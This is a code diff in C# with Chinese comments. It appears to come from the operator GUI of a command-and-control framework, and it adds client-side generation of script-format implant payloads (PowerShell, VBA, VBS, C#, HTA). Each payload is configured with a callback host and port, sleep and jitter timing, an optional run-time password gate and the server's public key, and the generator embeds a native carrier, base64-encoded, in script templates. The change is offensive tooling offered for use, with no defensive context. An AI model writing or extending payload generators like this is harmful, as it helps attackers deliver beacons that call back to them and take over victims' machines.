@@ -4161,6 +4161,13 @@ namespace CsdevGui
                 return GenerateNativeLocally(fmt, host, port, ssl, outFile, sleep, jitter, password, pubkey);
             }
 
+            // 脚本类格式 (ps1/vba/vbs/cs/hta) 同样客户端本地生成, 载体用原生模板。
+            if (ScriptGenerator.Supports(fmt))
+            {
+                byte[] pubkey = await FetchServerPubkeyAsync();
+                return GenerateScriptLocally(fmt, host, port, ssl, outFile, sleep, jitter, password, pubkey);
+            }
+
             // 请求体由 PayloadRequest.Build 构造 (纯函数, 字段名/省略规则有自测钉住)
             var body = PayloadRequest.Build(fmt, host, port, ssl, outFile, sleep, jitter, noSleep, password);
             using (var doc = await _api.BuildPayloadAsync(body))
@@ -4352,6 +4359,65 @@ namespace CsdevGui
             GenLine("");
             GenLine("\u2714 生成成功  " + Fmt.Size(res.Blob.Length));
             SetStatus("生成成功: " + Path.GetFileName(dest) + "  " + Fmt.Size(res.Blob.Length));
+            return true;
+        }
+
+        /// <summary>
+        /// 客户端本地生成脚本类格式载荷 (ps1/vba/vbs/cs/hta): 内嵌载体用原生模板,
+        /// base64 后包进脚本模板, 零 gcc / 零 PowerShell / 零服务端依赖。
+        /// </summary>
+        private bool GenerateScriptLocally(string fmt, string host, long port, bool ssl,
+                                           string outFile, long sleep, long jitter, string password,
+                                           byte[] pubkey)
+        {
+            var res = ScriptGenerator.Generate(fmt, host, (int)port, ssl, "", (int)sleep, (int)jitter, password, pubkey);
+
+            GenLine(pubkey != null
+                ? "    [公钥] 已用服务端当前公钥 (与 data/csdev.key 同源)"
+                : "    [公钥] 未取到服务端公钥, 回退模板编译期公钥");
+
+            string shown = MaskPwd(res.Log ?? "", password);
+            if (!string.IsNullOrEmpty(shown))
+            {
+                foreach (string raw in shown.Split('\n')) GenLine(raw.TrimEnd('\r'));
+            }
+            if (res.Error != null)
+            {
+                GenLine("[stderr] " + res.Error);
+                GenLine("");
+                GenLine("\u2718 生成失败: " + MaskPwd(res.Error, password));
+                SetStatus("生成失败: " + res.Error);
+                return false;
+            }
+
+            string dest = outFile;
+            if (string.IsNullOrEmpty(dest))
+            {
+                dest = Path.Combine(_devRoot, "build", "payload", res.FileName);
+            }
+            try
+            {
+                string dir = Path.GetDirectoryName(dest);
+                if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir);
+                File.WriteAllBytes(dest, res.Bytes);
+            }
+            catch (Exception ex)
+            {
+                GenLine("[!] 保存到本机失败: " + ex.Message);
+                SetStatus("载荷已生成, 但保存到本机失败");
+                return false;
+            }
+
+            GenLine("");
+            GenLine("[+] 已保存到本机: " + dest);
+            GenLine("    " + res.Bytes.Length + " 字节 (脚本文本)");
+            if (!string.IsNullOrEmpty(password))
+            {
+                GenLine("    [口令门控] 已启用 — 运行时需带口令");
+            }
+            GenLine("");
+            GenLine("\u2714 生成成功");
+            SetStatus("生成成功: " + Path.GetFileName(dest));
             return true;
         }
 
